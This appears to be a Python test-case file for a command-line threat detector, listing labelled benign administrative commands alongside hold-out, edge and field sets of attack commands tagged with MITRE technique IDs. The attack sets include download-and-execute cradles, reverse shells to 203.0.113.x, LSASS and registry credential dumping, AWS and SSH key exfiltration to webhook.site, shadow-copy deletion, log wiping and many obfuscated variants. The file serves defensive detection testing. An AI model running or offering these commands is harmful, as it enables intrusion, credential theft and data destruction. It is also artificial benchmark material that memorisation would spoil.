    Case("rundll32-desk-cpl", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl", "low", "admin"),
    Case("rundll32-printui", r"rundll32 printui.dll,PrintUIEntry /in /n \\server\printer", "low", "admin"),
    Case("rundll32-lock", "rundll32.exe user32.dll,LockWorkStation", "low", "admin"),
    Case("control-ncpa", "control.exe ncpa.cpl", "low", "regression: control .cpl rule"),
    Case("wmic-os", "wmic os get Caption,Version", "low", "admin"),
    Case("reg-add-app", r"reg add HKCU\Software\MyApp /v Theme /t REG_SZ /d dark /f", "low", "admin"),
    Case("reg-query-defender", r'reg query "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware', "low", "admin"),
    Case("schtasks-backup", r'schtasks /create /tn "Nightly Backup" /tr "C:\Scripts\backup.bat" /sc daily /st 02:00', "notable", "admin"),
    Case("certutil-addstore", 'certutil -addstore -f "Root" company-ca.cer', "low", "admin"),
    Case("certutil-hashfile", "certutil -hashfile file.iso SHA256", "low", "admin"),
    Case("bitsadmin-list", "bitsadmin /list /allusers", "low", "admin"),
    Case("mstsc", "mstsc /v:server01", "notable", "admin"),
    Case("enter-pssession", "Enter-PSSession -ComputerName server01", "notable", "admin"),
    Case("vssadmin-list", "vssadmin list shadows", "low", "admin"),
    Case("wevtutil-query", "wevtutil qe Security /c:10 /f:text", "low", "admin"),
    Case("bcdedit-enum", "bcdedit /enum", "low", "admin"),
    Case("netsh-allow-rule", 'netsh advfirewall firewall add rule name="App" dir=in action=allow protocol=TCP localport=8443', "low", "admin"),
    Case("netsh-wlan", "netsh wlan show profiles", "low", "admin"),
    Case("icacls-iis", r'icacls C:\inetpub\wwwroot /grant "IIS_IUSRS:(OI)(CI)RX"', "low", "admin"),
    Case("wsl-install", "wsl --install -d Ubuntu", "low", "admin"),
    Case("7z-extract", r"7z x archive.7z -oC:\extract", "low", "admin"),
    Case("7z-backup", r"7z a backup.7z C:\Projects\site", "notable", "admin"),
    Case("compress-archive", r"Compress-Archive -Path .\logs -DestinationPath logs.zip", "low", "admin"),
    Case("defender-enable", "Set-MpPreference -DisableRealtimeMonitoring $false", "low", "regression: enabling Defender"),
    Case("get-process-lsass", "Get-Process lsass", "low", "admin"),
    Case("ps-b64-decode-text", "powershell -c \"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aGVsbG8gd29ybGQ='))\"", "notable", "admin"),
    Case("net-user-list", "net user", "low", "admin"),
    Case("net-localgroup-list", "net localgroup administrators", "low", "admin"),
    Case("findstr-errors", 'findstr /s /i "error" *.log', "low", "admin"),
    Case("whoami", "whoami", "low", "admin"),
    Case("systeminfo-os", 'systeminfo | findstr /B /C:"OS Name"', "low", "admin"),
    Case("stop-service", "Stop-Service -Name Spooler", "low", "admin"),
    Case("nmap-help", "nmap --help", "low", "regression: help query"),
    Case("curl-bearer-jwt", 'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" https://api.example.com/v1/me', "notable", "dev"),
]


# ── Hold-out set ─────────────────────────────────────────────────────────────
# Written after the rules were tuned against ATTACKS/BENIGN above, and first
# scored *before* any rule was adjusted for it. Its first-run numbers are the
# honest generalisation estimate; see scripts/benchmark.py.

HOLDOUT_ATTACKS: list[Case] = [
    Case("h-nishang-tcp", "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 203.0.113.5 -Port 4444\"", "malicious", "T1059.001 Nishang"),
    Case("h-echo-pipe-ps", "cmd /c echo IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.5/a') | powershell -noprofile -", "malicious", "T1059.001"),
    Case("h-url-dll-hta", "rundll32.exe url.dll,FileProtocolHandler file://C:/Users/Public/p.hta", "suspicious", "T1218.011 LOLBAS Url.dll"),
    Case("h-mshta-js-sct", 'mshta.exe javascript:a=GetObject("script:http://203.0.113.5/a.sct").Exec();close();', "malicious", "T1218.005"),
    Case("h-installutil-tasks", r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\a.exe", "suspicious", "T1218.004"),
    Case("h-ps-dl-temp-run", "powershell -c \"$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla');$wc.DownloadFile('https://203.0.113.5/s.exe',\\\"$env:TEMP\\s.exe\\\");& \\\"$env:TEMP\\s.exe\\\"\"", "malicious", "T1105"),
    Case("h-wmic-rundll32", r'wmic.exe process call create "rundll32.exe C:\ProgramData\x.dll,DllRegisterServer"', "suspicious", "T1047"),
    Case("h-schtasks-public", r'schtasks /create /tn "\Microsoft\Windows\Update\Check" /tr "C:\Users\Public\Libraries\u.exe" /sc onlogon /rl highest /f', "suspicious", "T1053.005"),
    Case("h-runonce-rundll32", r'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v x /d "rundll32 C:\ProgramData\x.dll,Start" /f', "malicious", "T1547.001"),
    Case("h-new-service", r'powershell New-Service -Name "WinUpdate" -BinaryPathName "C:\ProgramData\u.exe" -StartupType Automatic', "suspicious", "T1543.003"),
    Case("h-comsvcs-bin", r'tasklist /fi "imagename eq lsass.exe" & rundll32 comsvcs.dll MiniDump 700 C:\Windows\Temp\d.bin full', "malicious", "T1003.001"),
    Case("h-out-minidump", r"powershell -c \"Get-Process lsass | Out-Minidump -DumpFilePath C:\temp\"", "malicious", "T1003.001 PowerSploit"),
    Case("h-reg-save-security", r"reg.exe save hklm\security C:\Users\Public\sec.hiv", "malicious", "T1003.004"),
    Case("h-vss-copy-system", r"vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\temp\sys", "malicious", "T1003.002"),
    Case("h-dcsync", "Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:corp.local /user:krbtgt\"'", "malicious", "T1003.006"),
    Case("h-getuserspns", "python3 GetUserSPNs.py corp.local/svc:Password1 -dc-ip 10.0.0.10 -request", "malicious", "T1558.003"),
    Case("h-cme-pth", "crackmapexec smb 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -x whoami", "malicious", "T1550.002"),
    Case("h-winrs", r'winrs -r:dc01 -u:corp\admin -p:Passw0rd "cmd /c C:\ProgramData\b.exe"', "suspicious", "T1021.006"),
    Case("h-sc-remote", r'sc \\fs01 create upd binpath= "C:\Windows\Temp\u.exe" & sc \\fs01 start upd', "malicious", "T1021.002"),
    Case("h-mp-disable-multi", "powershell Set-MpPreference -DisableIOAVProtection $true -DisableScriptScanning $true", "malicious", "T1562.001"),
    Case("h-reg-rtp-off", r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f', "malicious", "T1562.001"),
    Case("h-psreadline-history", "powershell -c \"Remove-Item (Get-PSReadlineOption).HistorySavePath\"", "suspicious", "T1070.003"),
    Case("h-wevtutil-clear-log", "wevtutil.exe clear-log Application", "malicious", "T1070.001"),
    Case("h-bootstatuspolicy", "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures", "malicious", "T1490"),
    Case("h-ransom-prep-chain", "cmd /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet", "malicious", "T1490"),
    Case("h-stop-sql", "net stop MSSQLSERVER /y & net stop SQLWriter /y", "malicious", "T1489"),
    Case("h-adcomputer-export", r"powershell -c \"Get-ADComputer -Filter * -Properties * | Export-Csv C:\ProgramData\c.csv\"", "low", "T1018"),
    Case("h-domain-recon-chain", 'net view /all /domain & nltest /dclist:corp & net group "Domain Admins" /domain', "notable", "T1482"),
    Case("h-7z-fullpath-pw", r'"C:\Program Files\7-Zip\7z.exe" a -tzip -pP@ss C:\Windows\Temp\o.zip C:\Users\*\Documents\*.docx', "suspicious", "T1560.001"),
    Case("h-zip-then-ftp", r"powershell -c \"Compress-Archive C:\Shares\HR C:\Windows\Temp\hr.zip; curl.exe -T C:\Windows\Temp\hr.zip ftp://203.0.113.5/\"", "suspicious", "T1048.003"),
    Case("h-mega-put", r"MEGAcmd\mega-put.bat C:\ProgramData\d.7z", "notable", "T1567.002"),
    Case("h-ngrok-rdp", "ngrok tcp 3389", "suspicious", "T1572"),
    Case("h-plink-reverse", "plink.exe -ssh -l root -pw toor -R 3389:127.0.0.1:3389 203.0.113.5", "suspicious", "T1572"),
    Case("h-sh-devudp", "sh -i >& /dev/udp/203.0.113.5/53 0>&1", "malicious", "T1059.004"),
    Case("h-mknod-nc", "rm -f /tmp/p; mknod /tmp/p p && nc 203.0.113.5 4444 0</tmp/p | /bin/bash 1>/tmp/p", "malicious", "T1059.004"),
    Case("h-ldpreload-install", "wget http://203.0.113.5/ld.so -O /usr/lib/libsystem.so && echo /usr/lib/libsystem.so > /etc/ld.so.preload", "malicious", "T1574.006"),
    Case("h-bashrc-revshell", "echo 'bash -i >& /dev/tcp/203.0.113.5/443 0>&1' >> ~/.bashrc", "malicious", "T1546.004"),
    Case("h-crontab-devshm", '(crontab -l 2>/dev/null; echo "*/10 * * * * /dev/shm/.x") | crontab -', "malicious", "T1053.003"),
    Case("h-creds-to-webhook", "cat ~/.aws/credentials ~/.ssh/id_rsa | curl -X POST -d @- https://webhook.site/abc", "malicious", "T1552.001 + T1567"),
    Case("h-grep-passwords", "grep -rnw / -e 'password' --include=*.conf 2>/dev/null", "notable", "T1552.001"),
    Case("h-sudo-minus-one", "sudo -u#-1 /bin/bash", "suspicious", "T1068 CVE-2019-14287"),
    Case("h-chmod-s-find", "chmod +s /usr/bin/find", "malicious", "T1548.001"),
    Case("h-passwd-append", 'echo "hacker:$(openssl passwd -1 pass):0:0:root:/root:/bin/bash" >> /etc/passwd', "malicious", "T1136.001"),
    Case("h-auditd-off", "systemctl stop auditd; auditctl -e 0; rm -f /var/log/audit/audit.log", "malicious", "T1562.012"),
    Case("h-shred-wtmp", "shred -zu /var/log/wtmp /var/log/btmp /var/log/lastlog", "malicious", "T1070.002"),
    Case("h-curl-sudo-bash", "curl -sL https://203.0.113.5/install.sh | sudo bash -s -- --token abc", "malicious", "T1059.004"),
    Case("h-pty-spawn", "python3 -c \"import pty;pty.spawn('/bin/bash')\"", "notable", "T1059.006"),
    Case("h-kdevtmpfsi", "nohup /tmp/.ICE-unix/kdevtmpfsi &", "malicious", "T1496 Kinsing"),
    Case("h-xattr-quarantine", "xattr -d com.apple.quarantine /Applications/Updater.app && open /Applications/Updater.app", "notable", "T1553.001"),
    Case("h-start-min-iex", 'cmd /c "start /min powershell -w hidden -c $x=(iwr http://203.0.113.5/a -UseBasicParsing).Content; iex $x"', "malicious", "T1059.001"),
    Case("h-certutil-decode-run", r"certutil.exe -decode C:\Users\Public\a.txt C:\Users\Public\a.exe && C:\Users\Public\a.exe", "suspicious", "T1140"),
    Case("h-mshta-temp-hta", r'cmd /c "C:\Windows\System32\mshta.exe" "C:\Users\victim\AppData\Local\Temp\inv.hta"', "suspicious", "T1218.005"),
    Case("h-ps-hidden-public-file", r"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\Music\update.ps1", "suspicious", "T1059.001"),
    Case("h-enable-builtin-admin", "net user administrator /active:yes && net user administrator N3wP@ss!", "suspicious", "T1078.003"),
]

HOLDOUT_BENIGN: list[Case] = [
    Case("h-git-log", "git log --oneline -n 20", "low", "dev"),
    Case("h-npm-ci", "npm ci && npm run lint", "low", "dev"),
    Case("h-yarn", "yarn install --frozen-lockfile", "low", "dev"),
    Case("h-venv", "python -m venv .venv && source .venv/bin/activate", "low", "dev"),
    Case("h-pytest", 'pytest -q tests/ -k "not slow"', "low", "dev"),
    Case("h-compose-logs", "docker compose logs -f backend", "low", "dev"),
    Case("h-docker-prune", "docker system prune -af", "low", "dev"),
    Case("h-kubectl-logs", "kubectl logs deploy/api -n prod --tail=100", "low", "dev"),
    Case("h-helm", "helm upgrade --install api ./chart -f values.yaml", "low", "dev"),
    Case("h-ansible", "ansible-playbook -i inventory site.yml --limit web", "low", "dev"),
    Case("h-curl-head", "curl -I https://example.com", "low", "dev"),
    Case("h-curl-terraform-zip", "curl -o terraform.zip https://releases.hashicorp.com/terraform/1.7.0/terraform_1.7.0_linux_amd64.zip", "low", "dev"),
    Case("h-wget-csv", "wget -q https://example.com/data.csv -O data.csv", "low", "dev"),
    Case("h-unzip", "unzip terraform.zip -d /usr/local/bin", "low", "dev"),
    Case("h-kubectl-install", "curl -LO https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl && chmod +x kubectl", "notable", "kubernetes.io install docs"),
    Case("h-vs-buildtools", "Invoke-WebRequest https://aka.ms/vs/17/release/vs_buildtools.exe -OutFile vs_buildtools.exe", "notable", "learn.microsoft.com install docs"),
    Case("h-systemctl-enable", "sudo systemctl enable --now docker", "low", "admin"),
    Case("h-ufw-allow", "sudo ufw allow 443/tcp", "low", "admin"),
    Case("h-df-free", "df -h && free -m", "low", "admin"),
    Case("h-tail-syslog", "tail -f /var/log/syslog", "low", "admin"),
    Case("h-rm-rotated-log", "sudo rm /var/log/nginx/access.log.1", "notable", "admin"),
    Case("h-find-old-gz", 'find /var/log -name "*.gz" -mtime +30 -delete', "low", "admin"),
    Case("h-ssh-identity", "ssh -i ~/.ssh/id_ed25519 ubuntu@10.0.1.5", "low", "admin"),
    Case("h-scp-dist", "scp -r ./dist user@host:/var/www/", "low", "admin"),
    Case("h-mysqldump", "mysqldump -u root -p mydb > backup.sql", "low", "admin"),
    Case("h-pg-dump", "pg_dump -Fc mydb | gzip > mydb.dump.gz", "low", "admin"),
    Case("h-tar-logs", "tar -czf logs.tar.gz /var/log/nginx", "low", "admin"),
    Case("h-openssl-enc", "openssl enc -aes-256-cbc -in secrets.txt -out secrets.enc", "low", "admin"),
    Case("h-gpg-symmetric", "gpg --symmetric --cipher-algo AES256 file.txt", "low", "admin"),
    Case("h-cron-backup", 'echo "0 2 * * * /usr/local/bin/backup.sh" | crontab -', "notable", "admin"),
    Case("h-cat-pubkey", "cat ~/.ssh/id_rsa.pub", "low", "admin"),
    Case("h-chmod-authkeys", "chmod 600 ~/.ssh/authorized_keys", "low", "admin"),
    Case("h-append-pubkey", "cat id_ed25519.pub >> ~/.ssh/authorized_keys", "suspicious", "admin (dual-use)"),
    Case("h-usermod-sudo", "sudo usermod -aG sudo alice", "notable", "admin (dual-use)"),
    Case("h-histsize", "export HISTSIZE=10000", "low", "admin"),
    Case("h-ps-remove-logs", r"Get-ChildItem -Path C:\Logs -Recurse -Include *.log | Remove-Item", "low", "admin"),
    Case("h-test-netconnection", "Test-NetConnection server01 -Port 443", "low", "admin"),
    Case("h-wmi-disk", "Get-WmiObject Win32_LogicalDisk | Select DeviceID,FreeSpace", "low", "admin"),
    Case("h-restart-computer", "Restart-Computer -Force", "low", "admin"),
    Case("h-new-item-dir", r"New-Item -ItemType Directory -Path C:\Temp\build", "low", "admin"),
    Case("h-copy-to-programdata", r"Copy-Item .\app.exe C:\ProgramData\MyApp\app.exe", "low", "admin"),
    Case("h-start-notepad", "Start-Process notepad.exe", "low", "admin"),
    Case("h-start-runas", r'Start-Process "C:\Program Files\App\app.exe" -Verb RunAs', "notable", "admin"),
    Case("h-ps-file-scripts", r"powershell -File C:\Scripts\cleanup.ps1", "low", "admin"),
    Case("h-dir-public", r"cmd /c dir C:\Users\Public", "low", "admin"),
    Case("h-xcopy", r"xcopy C:\Source D:\Dest /E /H /C /I", "low", "admin"),
    Case("h-net-share-create", r"net share reports=C:\Reports /grant:everyone,read", "low", "admin"),
    Case("h-net-user-domain", "net user alice /domain", "low", "admin"),
    Case("h-add-rdp-user", 'Add-LocalGroupMember -Group "Remote Desktop Users" -Member alice', "notable", "admin (dual-use)"),
    Case("h-new-localuser", "New-LocalUser -Name svc_backup -Password (Read-Host -AsSecureString)", "suspicious", "admin (dual-use)"),
    Case("h-schtasks-run", 'schtasks /run /tn "Nightly Backup"', "low", "admin"),
    Case("h-certutil-verify", "certutil -verify cert.cer", "low", "admin"),
    Case("h-wmic-disk", "wmic logicaldisk get size,freespace,caption", "low", "admin"),
    Case("h-git-bash", '"C:\\Program Files\\Git\\bin\\bash.exe" -c "git status"', "notable", "dev"),
    Case("h-rundll32-sysdm", r"C:\Windows\System32\rundll32.exe sysdm.cpl,EditEnvironmentVariables", "low", "admin"),
    Case("h-choco-fullpath", r'"C:\ProgramData\chocolatey\bin\choco.exe" upgrade all -y', "low", "admin"),
    Case("h-slack-appdata", r"C:\Users\me\AppData\Local\slack\slack.exe", "low", "user app"),
    Case("h-python-hostname", 'python3 -c "import socket; print(socket.gethostname())"', "notable", "dev"),
    Case("h-perl-sub", "perl -pi -e 's/foo/bar/g' file.txt", "low", "dev"),
    Case("h-php-version", "php -r 'echo phpversion();'", "low", "dev"),
    Case("h-awk-pipeline", "awk '{print $1}' access.log | sort | uniq -c | sort -rn | head", "low", "dev"),
    Case("h-base64-encode", "base64 -w0 image.png > image.b64", "low", "dev"),
    Case("h-curl-ipify", "curl -s https://api.ipify.org", "low", "dev"),
    Case("h-id-uname", "id; uname -a", "low", "admin"),
    Case("h-ls-tmp", "ls -la /tmp/", "low", "admin"),
    Case("h-tmp-ci-script", "/tmp/build/run-tests.sh --fast", "low", "dev"),
    Case("h-docker-binfmt", "sudo docker run --privileged --rm tonistiigi/binfmt --install all", "notable", "docker buildx docs"),
    Case("h-portainer-sock", "docker run -d -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer-ce", "notable", "portainer docs"),
    Case("h-rundll32-ordinal-run", r"rundll32.exe C:\Windows\System32\shell32.dll,#61", "notable", "admin"),
]


# ── Edge set: obfuscation and restyling ──────────────────────────────────────
# Each case is an attack already represented above, rewritten with one
# shell-level trick. First scored before any rule was written for it.

EDGE_ATTACKS: list[Case] = [
    # bash word-splitting / quoting tricks
    Case("e-bash-ifs", "curl${IFS}-fsSL${IFS}http://203.0.113.7/i.sh|bash", "malicious", "T1027 ${IFS} spacing"),
    Case("e-bash-empty-quotes", "c''url -s http://203.0.113.7/i.sh | b\"\"ash", "malicious", "T1027 empty-quote splitting"),
    Case("e-bash-backslash", r"w\get -qO- http://203.0.113.7/i.sh | s\h", "malicious", "T1027 backslash escapes"),
    Case("e-bash-var-assembly", "a=cu;b=rl;$a$b -s http://203.0.113.7/i.sh | sh", "malicious", "T1027 variable assembly"),
    Case("e-bash-glob-shadow", "/???/c?t /e??/sh?dow", "suspicious", "T1027 glob path"),
    Case("e-bash-ansi-c-hex", "$'\\x63\\x75\\x72\\x6c' -s http://203.0.113.7/i.sh | sh", "malicious", "T1027 ANSI-C quoting"),
    Case("e-bash-process-subst", "bash <(curl -s http://203.0.113.7/i.sh)", "malicious", "T1059.004"),
    Case("e-sh-c-wget-subst", "sh -c \"$(wget -qO- http://203.0.113.7/i.sh)\"", "malicious", "T1059.004"),
    Case("e-xxd-pipe-sh", "echo 6375726c202d7320687474703a2f2f3230332e302e3131332e372f692e7368207c207368 | xxd -r -p | sh", "malicious", "T1027 hex pipe"),
    Case("e-printf-hex-sh", "printf '\\x69\\x64\\x3b\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77' | sh", "suspicious", "T1027 printf hex"),
    Case("e-base64-here-string", "bash -c \"$(base64 -d <<< " + _b64("curl -s http://203.0.113.7/i.sh | sh") + ")\"", "malicious", "T1027"),
    Case("e-openssl-b64-sh", "echo " + _b64("curl -s http://203.0.113.7/i.sh | sh") + " | openssl base64 -d | sh", "malicious", "T1027"),
    Case("e-python-b64-oneliner", "python3 -c \"import base64,os;os.system(base64.b64decode('" + _b64("curl -s http://203.0.113.7/i.sh | sh") + "').decode())\"", "malicious", "T1059.006"),
    Case("e-nc-c-sh", "nc 203.0.113.7 4444 -c sh", "malicious", "T1059.004"),
    Case("e-telnet-pipe-sh", "telnet 203.0.113.7 4444 | /bin/sh | telnet 203.0.113.7 4445", "malicious", "T1059.004"),
    Case("e-exec-fd-devtcp", "exec 5<>/dev/tcp/203.0.113.7/443; cat <&5 | while read l; do $l 2>&5 >&5; done", "malicious", "T1059.004"),
    # PowerShell
    Case("e-ps-enco-abbrev", "powershell -enco " + _ps_enc(_CRADLE), "malicious", "T1027.010 flag abbreviation"),
    Case("e-ps-slash-enc", "powershell /nop /w hidden /enc " + _ps_enc(_CRADLE), "malicious", "T1027.010 slash parameters"),
    Case("e-ps-char-array-iex", "powershell -c \"&([char[]](73,69,88)-join'') (irm http://203.0.113.7/a)\"", "malicious", "T1027"),
    Case("e-ps-var-concat-iex", "powershell -c \"$a='IE';$b='X';&($a+$b) (irm http://203.0.113.7/a)\"", "malicious", "T1027"),
    Case("e-ps-gcm-wildcard", "powershell -c \"&(gcm i*x) (irm http://203.0.113.7/a)\"", "malicious", "T1027 Get-Command wildcard"),
    Case("e-ps-alias-iex", "powershell -c \"sal z iex; z (irm http://203.0.113.7/a)\"", "malicious", "T1027 Set-Alias"),
    Case("e-ps-scriptblock-create", "powershell -c \"[scriptblock]::Create((irm http://203.0.113.7/a)).Invoke()\"", "malicious", "T1059.001"),
    Case("e-ps-invokescript", "powershell -c \"$ExecutionContext.InvokeCommand.InvokeScript((irm http://203.0.113.7/a))\"", "malicious", "T1059.001"),
    Case("e-ps-stdin-dash", "cmd /c \"echo irm http://203.0.113.7/a ^| iex | powershell -\"", "suspicious", "T1059.001 stdin"),
    Case("e-ps-webrequest-content-iex", "powershell -c \"iex ([Net.WebRequest]::Create('http://203.0.113.7/a').GetResponse().GetResponseStream() | % { (New-Object IO.StreamReader $_).ReadToEnd() })\"", "malicious", "T1059.001"),
    Case("e-ps-xmlhttp-com", "powershell -c \"$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://203.0.113.7/a',$false);$h.send();iex $h.responseText\"", "malicious", "T1059.001"),
    Case("e-ps-reverse-string", "powershell -c \"$s='sp.a/7.311.0.302//:ptth';iex (irm (-join $s[-1..-$s.Length]))\"", "suspicious", "T1027"),
    Case("e-ps-bxor-loop", "powershell -c \"$k=35;$b=[Convert]::FromBase64String('" + _b64("x" * 60) + "');iex (-join ($b | % { [char]($_ -bxor $k) }))\"", "suspicious", "T1027 XOR decode"),
    # cmd / LOLBin restyling
    Case("e-certutil-slash-flags", "certutil /urlcache /split /f http://203.0.113.7/p.exe p.exe", "malicious", "T1105 slash flags"),
    Case("e-cmd-for-loop-exec", "cmd /v /c \"set c=certutil -urlcache -f http://203.0.113.7/p.exe %TEMP%\\p.exe&& !c!\"", "malicious", "T1027 delayed expansion"),
    Case("e-cmd-comspec-env", "%COMSPEC% /c certutil -urlcache -f http://203.0.113.7/p.exe %TEMP%\\p.exe", "malicious", "T1059.003"),
    Case("e-mshta-vbs-wscript-run", "mshta vbscript:CreateObject(\"Wscript.Shell\").Run(\"powershell -nop -w hidden -c iex(irm http://203.0.113.7/a)\",0)(window.close)", "malicious", "T1218.005"),
    Case("e-regsvr32-webdav", r"regsvr32 /s /i:\\203.0.113.7@80\dav\p.sct scrobj.dll", "malicious", "T1218.010"),
    Case("e-rundll32-sta-clsid", "rundll32.exe -sta {F5078F35-C551-11D3-89B9-0000F81FE221}", "notable", "T1218.011 COM CLSID"),
    Case("e-wmic-fullwidth", "wmic process call create \"\uff50\uff4f\uff57\uff45\uff52\uff53\uff48\uff45\uff4c\uff4c -nop -w hidden -c iex(irm http://203.0.113.7/a)\"", "malicious", "T1027 fullwidth characters"),
    Case("e-zero-width-split", "vssadmin del\u200bete shad\u200bows /all /quiet", "malicious", "T1027 zero-width characters"),
    Case("e-multiline-script", "$u = 'http://203.0.113.7/a.ps1'\r\n$c = (New-Object Net.WebClient).DownloadString($u)\r\nInvoke-Expression $c", "malicious", "T1059.001 multi-line"),
    Case("e-cmd-line-continuation", "certutil -urlcache ^\r\n -split -f ^\r\n http://203.0.113.7/p.exe p.exe", "malicious", "T1105 caret continuation"),
    Case("e-long-junk-then-iex", "powershell -c \"$j='" + "A1b2" * 9000 + "'; iex (irm http://203.0.113.7/a)\"", "malicious", "signal after 36 KB of filler"),
]

EDGE_BENIGN: list[Case] = [
    Case("e-word-paste-ipconfig", "ipconfig \u2013all", "low", "pasted from a document (en dash)"),
    Case("e-smart-quotes-echo", "echo \u201chello world\u201d", "low", "pasted from a document (smart quotes)"),
    Case("e-ps-endash-bypass-file", "powershell \u2013ExecutionPolicy Bypass \u2013File .\\build.ps1", "notable", "pasted from a document"),
    Case("e-multiline-build", "npm ci\nnpm run build\nnpm test", "low", "multi-line dev script"),
    Case("e-bash-ifs-benign", "IFS=, read -r a b c <<< \"1,2,3\"", "low", "IFS used normally"),
    Case("e-glob-benign", "ls /usr/lib/python3.*/site-packages/*.dist-info", "low", "globbing"),
    Case("e-bash-var-benign", "f=report; e=pdf; open \"$f.$e\"", "low", "variables"),
    Case("e-printf-benign", "printf '%s\\n' one two three", "low", "printf"),
    Case("e-xxd-benign", "xxd -p file.bin | head -n 5", "low", "hex dump"),
    Case("e-nc-listen-benign", "nc -zv 10.0.0.5 22 443 3389", "low", "port check"),
    Case("e-telnet-benign", "telnet mail.example.com 25", "low", "smtp check"),
    Case("e-gcm-benign", "Get-Command *-Service", "low", "command discovery"),
    Case("e-sal-benign", "Set-Alias ll Get-ChildItem", "low", "alias"),
    Case("e-scriptblock-benign", "$sb = [scriptblock]::Create('Get-Date'); & $sb", "notable", "dynamic scriptblock"),
    Case("e-char-array-benign", "[char[]](72,105) -join ''", "notable", "char array"),
    Case("e-grep-hunting-query", "grep -i 'mimikatz\\|sekurlsa' /var/log/edr/process.log", "notable", "analyst hunting query"),
    Case("e-findstr-hunting", "findstr /i \"vssadmin delete shadows\" C:\\Logs\\sysmon.txt", "notable", "analyst hunting query"),
    Case("e-select-string-hunting", "Select-String -Path .\\events.csv -Pattern 'Invoke-Mimikatz','DownloadString'", "notable", "analyst hunting query"),
    Case("e-long-benign-args", "tar -czf backup.tar.gz " + " ".join(f"dir{i}/file{i}.txt" for i in range(400)), "low", "long argument list"),
]

# Cases the pipeline is known to get wrong, kept so the gap stays visible and
# measured. Not part of any pass/fail gate.
KNOWN_LIMITATIONS: list[Case] = [
    # A tool name inside a JSON body being *sent* is indistinguishable, by text
    # alone, from the tool being invoked.
    Case("e-json-payload", "curl -X POST https://api.example.com/log -H 'Content-Type: application/json' -d '{\"cmd\":\"powershell -enc\",\"note\":\"mimikatz detected and blocked\"}'", "notable", "telemetry containing indicator words"),
]


# ── Field set ─────────────────────────────────────────────────────────────────
# Written after the first production deploy, in two rounds, to look for gaps:
# living-off-the-land variants, cloud and container credential access, macOS,
# offensive tooling, and everyday admin commands that share a shape with them.
# Scored once before any change, then the pipeline was fixed:
#   round 1: 69/76 attacks at tier; 3 benign commands clearly over-rated
#   round 2: 61/87 attacks at tier; 10 benign commands clearly over-rated
# Like every set in this file these are written for the project, not captured
# from incidents, and the pipeline has since been adjusted against them.
# Attacks default to a minimum of "suspicious", benign to a maximum of "low";
# the override tables below record the dual-use commands where "notable"
# (or, for appending a key to authorized_keys, "suspicious") is the honest answer.
_FIELD_ATTACK_TIERS = {
    "enable-rdp": "notable", "sniff-creds": "notable", "masscan": "notable",
}
_FIELD_BENIGN_TIERS = {
    "ps-build": "notable", "b64-hello": "notable", "ssh-tunnel": "notable", "xattr-own": "notable",
    "iex-profile": "notable", "authorized-keys-own": "suspicious",
    "invoke-command-svc": "notable", "s3-sync": "notable", "curl-less": "notable",
    "cron-backup": "notable", "chattr-resolv": "notable", "cmdkey-list": "notable",
    "curl-upload-api": "notable", "psexec-local": "notable", "cloudflared-http": "notable",
    "reg-save-app": "notable", "tcpdump-443": "notable", "nc-listen": "notable",
}


def _field(prefix: str, attacks: dict[str, str], benign: dict[str, str]) -> tuple[list[Case], list[Case]]:
    return (
        [Case(f"{prefix}-{k}", v, _FIELD_ATTACK_TIERS.get(k, "suspicious"), "field probe") for k, v in attacks.items()],
        [Case(f"{prefix}-{k}", v, _FIELD_BENIGN_TIERS.get(k, "low"), "field probe") for k, v in benign.items()],
    )


def _field_round1() -> tuple[list[Case], list[Case]]:
    import base64
    import zlib  # noqa: F401

    H = "203.0.113.9"
    U = f"http://{H}"


    def b64u16(s: str) -> str:
        return base64.b64encode(s.encode("utf-16-le")).decode()


    def deflate_b64(s: str) -> str:
        c = zlib.compressobj(9, zlib.DEFLATED, -15)
        return base64.b64encode(c.compress(s.encode()) + c.flush()).decode()


    def xor_b64(s: str, k: int) -> str:
        return base64.b64encode(bytes(b ^ k for b in s.encode())).decode()


    PAY = f"IEX (New-Object Net.WebClient).DownloadString('{U}/a.ps1')"

    attacks = {
        "delayed-substr": rf'cmd /v /c "set p=xpowershellx&& !p:~1,10! -nop -w hidden -c iex(irm {U}/a)"',
        "for-f-exec": rf"for /f \"tokens=*\" %i in ('curl -s {U}/c') do %i".replace('\\"', '"'),
        "env-substr": rf"%COMSPEC:~0,1%ertutil -urlcache -split -f {U}/a.exe %TEMP%\a.exe",
        "ps-format-op": rf"""powershell -c "& ('{{1}}{{0}}' -f 'ex','i') ((New-Object Net.WebClient).('{{0}}{{1}}' -f 'Download','String').Invoke('{U}/a'))" """,
        "ps-replace": rf"""powershell -nop -c "iex ('iXXrm {U}/a | iXXex'.Replace('XX',''))" """,
